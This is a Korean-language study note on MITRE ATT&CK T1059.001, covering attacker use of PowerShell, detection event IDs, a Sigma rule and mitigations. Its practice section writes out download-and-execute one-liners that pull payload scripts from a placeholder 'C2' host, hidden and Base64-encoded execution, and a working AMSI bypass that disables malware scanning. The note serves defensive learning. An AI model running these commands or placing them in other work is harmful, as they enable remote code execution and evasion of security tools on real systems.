# T1059.001 — PowerShell

## 개요

**TA0002 / T1059.001**  
공격자가 PowerShell을 사용해 명령을 실행하는 기법.  
Windows 환경에서 가장 널리 사용되는 공격 도구 중 하나로, 내장 기능 활용으로 탐지 회피 가능.  
파일리스 공격, 인메모리 실행, 난독화 등 다양한 기법과 결합해 사용.

---

## 동작 방식

### 1. 실행 방법
- 직접 실행: `powershell.exe -Command "..."`
- Encoded Command: Base64 인코딩으로 탐지 회피
- 다운로드 및 실행: IEX (Invoke-Expression) + IWR (Invoke-WebRequest)
- 인메모리 로딩: Reflective Loading으로 디스크에 파일 없이 실행

### 2. 탐지 회피 기법
- `-w hidden` / `-WindowStyle Hidden` : 창 숨김
- `-NonInteractive -NoProfile` : 프로필 로드 방지
- Base64 / AES 인코딩으로 페이로드 난독화
- AMSI Bypass: 메모리 패치로 스캔 우회

### 3. 주요 활용 목적
- 페이로드 다운로드 및 실행
- 시스템 정보 수집 (Discovery)
- 자격증명 탈취 (Mimikatz 등)
- 횡적 이동 (PsExec, WMI, WinRM)

---

## 주요 커맨드 / 실습

### 기본 실행 방법
```powershell
# 창 숨김으로 명령 실행
powershell.exe -w hidden -c "Get-Process"

# Base64 인코딩 실행
$cmd = "Get-Process | Out-File C:\temp\procs.txt"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded
```

### 다운로드 및 인메모리 실행
```powershell
# 스크립트 다운로드 후 실행
IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')

# Invoke-WebRequest 활용
IWR -Uri http://C2/shell.ps1 -UseBasicParsing | IEX

# SSL 인증서 무시 후 다운로드
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('https://C2/payload.ps1')
```

### AMSI Bypass (메모리 패치)
```powershell
# amsiInitFailed 플래그 조작으로 AMSI 스캔 우회
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### 기본 정보 수집
```powershell
# 시스템 정보
systeminfo
Get-ComputerInfo

# 네트워크 정보
ipconfig /all
Get-NetIPConfiguration

# 프로세스 목록
Get-Process | Select Name,Id,Path
```

## 탐지 방법

### 주요 로그 / 이벤트
- **EventID 4103**: PowerShell Module Logging (모듈 실행)
- **EventID 4104**: PowerShell Script Block Logging (스크립트 내용)
- **EventID 4688**: powershell.exe 프로세스 생성 및 커맨드라인
- **AMSI 로그**: 악성 스크립트 패턴 탐지

### Sigma Rule
```yaml
title: Suspicious PowerShell Download and Execute
status: stable
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: \powershell.exe
    CommandLine|contains:
      - 'IEX'
      - 'Invoke-Expression'
      - 'DownloadString'
      - 'EncodedCommand'
      - 'hidden'
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059.001
```

## 대응 방안

1. **PowerShell 로깅 활성화** — Module Logging, Script Block Logging, Transcription
2. **Constrained Language Mode** — PowerShell 언어 기능 제한
3. **AMSI 보호 강화** — AMSI Provider 탐지 우회 시도 차단
4. **실행 정책** — AllSigned / RemoteSigned 정책 적용
5. **JEA (Just Enough Administration)** — 최소 권한 PowerShell 세션
